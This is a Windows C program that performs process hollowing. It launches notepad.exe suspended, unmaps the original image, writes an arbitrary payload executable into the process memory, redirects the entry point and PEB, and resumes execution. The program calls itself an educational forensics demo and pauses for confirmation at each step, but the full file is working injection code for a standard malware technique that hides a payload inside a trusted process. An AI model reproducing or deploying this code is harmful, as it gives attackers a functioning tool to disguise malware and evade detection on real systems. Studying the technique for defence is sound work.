#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// Function prototypes
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

void WaitForUser(const char* message) {
    printf("\n[PAUSE] %s\n", message);
    printf("Press ENTER to continue...");
    getchar();
    printf("\n");
}

BOOL ReadPayloadFile(const char* payloadPath, unsigned char** payload, size_t* payloadSize) {
    FILE* file = fopen(payloadPath, "rb");
    if (!file) {
        printf("[ERROR] Cannot open payload file: %s\n", payloadPath);
        return FALSE;
    }
    
    fseek(file, 0, SEEK_END);
    *payloadSize = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    *payload = (unsigned char*)malloc(*payloadSize);
    if (!*payload) {
        fclose(file);
        return FALSE;
    }
    
    fread(*payload, 1, *payloadSize, file);
    fclose(file);
    
    printf("[SUCCESS] Loaded payload: %zu bytes\n", *payloadSize);
    return TRUE;
}

BOOL ProcessHollowing(const char* targetPath, unsigned char* payload, size_t payloadSize) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CONTEXT ctx;
    DWORD bytesRead, bytesWritten;
    
    // Parse payload PE headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)payload + dosHeader->e_lfanew);
    
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE || ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[ERROR] Invalid PE file format\n");
        return FALSE;
    }
    
    printf("\n[PAYLOAD INFO]\n");
    printf("  Entry Point: 0x%X\n", ntHeaders->OptionalHeader.AddressOfEntryPoint);
    printf("  Image Base: 0x%p\n", (PVOID)ntHeaders->OptionalHeader.ImageBase);
    printf("  Size of Image: 0x%X\n", ntHeaders->OptionalHeader.SizeOfImage);
    
    WaitForUser("STEP 1: Ready to create suspended target process");
    
    // Step 1: Create target process in suspended state
    printf("[STEP 1] Creating suspended process: %s\n", targetPath);
    
    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, 
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[ERROR] Failed to create process. Error: %d\n", GetLastError());
        return FALSE;
    }
    
    printf("[SUCCESS] Process created with PID: %d\n", pi.dwProcessId);
    printf("[SUCCESS] Process is in SUSPENDED state\n");
    
    WaitForUser("STEP 2: Ready to retrieve thread context");
    
    // Step 2: Get thread context
    printf("[STEP 2] Getting thread context...\n");
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[ERROR] Failed to get thread context\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    printf("[SUCCESS] Thread context retrieved\n");
    printf("  RIP/EIP: 0x%p\n", (PVOID)ctx.Rip);
    
    // Read PEB to get image base address
    PVOID pebImageBaseOffset = (PVOID)((ULONG_PTR)ctx.Rdx + 0x10);
    PVOID imageBase;
    
    if (!ReadProcessMemory(pi.hProcess, pebImageBaseOffset, 
                          &imageBase, sizeof(PVOID), &bytesRead)) {
        printf("[ERROR] Failed to read image base address\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    printf("[SUCCESS] Original image base: 0x%p\n", imageBase);
    
    WaitForUser("STEP 3: Ready to unmap original executable from memory");
    
    // Step 3: Unmap original executable
    printf("[STEP 3] Unmapping original executable...\n");
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtUnmapViewOfSection NtUnmapViewOfSection = 
        (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    
    if (NtUnmapViewOfSection) {
        NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, imageBase);
        if (status == 0) {
            printf("[SUCCESS] Original image unmapped (memory hollowed out)\n");
        } else {
            printf("[WARNING] Unmapping returned status: 0x%X (continuing anyway)\n", status);
        }
    }
    
    WaitForUser("STEP 4: Ready to allocate memory for malicious payload");
    
    // Step 4: Allocate memory for payload
    printf("[STEP 4] Allocating memory in target process...\n");
    LPVOID newImageBase = VirtualAllocEx(pi.hProcess, 
                                         (PVOID)ntHeaders->OptionalHeader.ImageBase,
                                         ntHeaders->OptionalHeader.SizeOfImage,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_EXECUTE_READWRITE);
    
    if (!newImageBase) {
        // Try allocating at any address
        printf("[WARNING] Cannot allocate at preferred base, trying any address...\n");
        newImageBase = VirtualAllocEx(pi.hProcess, NULL,
                                     ntHeaders->OptionalHeader.SizeOfImage,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);
    }
    
    if (!newImageBase) {
        printf("[ERROR] Failed to allocate memory\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    printf("[SUCCESS] Memory allocated at: 0x%p\n", newImageBase);
    printf("  Size: 0x%X bytes\n", ntHeaders->OptionalHeader.SizeOfImage);
    
    WaitForUser("STEP 5: Ready to write PE headers to target process");
    
    // Step 5: Write PE headers
    printf("[STEP 5] Writing PE headers...\n");
    if (!WriteProcessMemory(pi.hProcess, newImageBase, payload,
                           ntHeaders->OptionalHeader.SizeOfHeaders, &bytesWritten)) {
        printf("[ERROR] Failed to write headers\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    printf("[SUCCESS] PE headers written (%d bytes)\n", bytesWritten);
    
    WaitForUser("STEP 6: Ready to write PE sections to target process");
    
    // Step 6: Write PE sections
    printf("[STEP 6] Writing PE sections...\n");
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        printf("  Writing section: %s\n", sectionHeader[i].Name);
        printf("    Virtual Address: 0x%X\n", sectionHeader[i].VirtualAddress);
        printf("    Size: 0x%X bytes\n", sectionHeader[i].SizeOfRawData);
        
        if (sectionHeader[i].SizeOfRawData > 0) {
            LPVOID sectionDestination = (LPVOID)((ULONG_PTR)newImageBase + sectionHeader[i].VirtualAddress);
            LPVOID sectionSource = (LPVOID)((ULONG_PTR)payload + sectionHeader[i].PointerToRawData);
            
            if (!WriteProcessMemory(pi.hProcess, sectionDestination, sectionSource,
                                   sectionHeader[i].SizeOfRawData, &bytesWritten)) {
                printf("[ERROR] Failed to write section %s\n", sectionHeader[i].Name);
                TerminateProcess(pi.hProcess, 0);
                return FALSE;
            }
            
            printf("    [SUCCESS] Section written\n");
        }
    }
    
    printf("[SUCCESS] All sections written to target process\n");
    
    WaitForUser("STEP 7: Ready to update entry point and PEB");
    
    // Step 7: Update entry point
    printf("[STEP 7] Updating thread context...\n");
    
    // Calculate new entry point
    ULONG_PTR entryPoint = (ULONG_PTR)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    ctx.Rcx = entryPoint;  // Set entry point in RCX for 64-bit
    
    printf("  New entry point: 0x%p\n", (PVOID)entryPoint);
    
    // Write new image base to PEB
    if (!WriteProcessMemory(pi.hProcess, pebImageBaseOffset, &newImageBase,
                           sizeof(PVOID), &bytesWritten)) {
        printf("[ERROR] Failed to update PEB\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    printf("[SUCCESS] PEB updated with new image base\n");
    
    // Update thread context
    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[ERROR] Failed to set thread context\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    printf("[SUCCESS] Thread context updated\n");
    
    WaitForUser("STEP 8: Ready to resume thread and execute payload");
    
    // Step 8: Resume thread
    printf("[STEP 8] Resuming thread to execute payload...\n");
    
    if (ResumeThread(pi.hThread) == -1) {
        printf("[ERROR] Failed to resume thread\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    printf("[SUCCESS] Thread resumed - Payload is now executing!\n");
    printf("[SUCCESS] Process hollowing complete\n");
    
    // Wait for the payload to finish
    printf("\n[INFO] Waiting for payload process to complete...\n");
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    // Get exit code
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    printf("[INFO] Payload process exited with code: %d\n", exitCode);
    
    // Clean up
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return TRUE;
}

int main(int argc, char* argv[]) {
    printf("=================================================\n");
    printf("    PROCESS HOLLOWING - EDUCATIONAL DEMO\n");
    printf("    Digital Forensics Research Project\n");
    printf("=================================================\n\n");
    
    printf("[WARNING] This is for EDUCATIONAL purposes only!\n");
    printf("[WARNING] Only use in controlled lab environments\n\n");
    
    // Configuration
    const char* targetProcess = "C:\\Windows\\System32\\notepad.exe";
    const char* payloadPath = "payload.exe";  // Your MessageBox payload
    
    if (argc > 1) {
        payloadPath = argv[1];
    }
    
    if (argc > 2) {
        targetProcess = argv[2];
    }
    
    printf("[CONFIGURATION]\n");
    printf("  Target Process: %s\n", targetProcess);
    printf("  Payload File: %s\n", payloadPath);
    
    printf("\n[INFO] This demo will execute actual process hollowing\n");
    printf("[INFO] Each step requires manual confirmation (press ENTER)\n\n");
    
    WaitForUser("Ready to start? This will load the payload file");
    
    // Load payload
    unsigned char* payload = NULL;
    size_t payloadSize = 0;
    
    if (!ReadPayloadFile(payloadPath, &payload, &payloadSize)) {
        printf("\n[ERROR] Failed to load payload\n");
        printf("\nUsage: %s [payload.exe] [target.exe]\n", argv[0]);
        printf("Example: %s payload.exe C:\\Windows\\System32\\notepad.exe\n", argv[0]);
        return 1;
    }
    
    // Perform process hollowing
    BOOL result = ProcessHollowing(targetProcess, payload, payloadSize);
    
    // Cleanup
    free(payload);
    
    printf("\n=================================================\n");
    if (result) {
        printf("           DEMO COMPLETED SUCCESSFULLY\n");
    } else {
        printf("              DEMO FAILED\n");
    }
    printf("=================================================\n");
    
    WaitForUser("Press ENTER to exit");
    
    return result ? 0 : 1;
}